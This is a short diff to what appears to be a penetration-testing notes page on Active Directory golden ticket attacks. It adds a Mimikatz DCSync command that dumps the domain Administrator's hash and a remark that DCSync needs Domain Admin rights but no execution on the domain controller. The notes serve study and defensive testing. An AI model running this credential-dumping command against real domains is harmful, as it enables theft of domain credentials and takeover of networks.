@@ -87,8 +87,12 @@ ls \\dc01.corp.local\c$
 
 ![Golden Ticket](/hackingnotes/images/golden_ticket_psremoting.png)
 
-In order to execute commands we can do a dcsync attack and once obtained the hash do a over-pass-the-hash.
+In order to execute commands we can do a **dcsync attack** and once obtained the hash do a over-pass-the-hash.
 
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
+```
+> **Note** Dcsync attack can be done in every domain computer. Command execution on the DC is not needed, but yes Domain Admin privileges.
 
 ## Mitigation
 
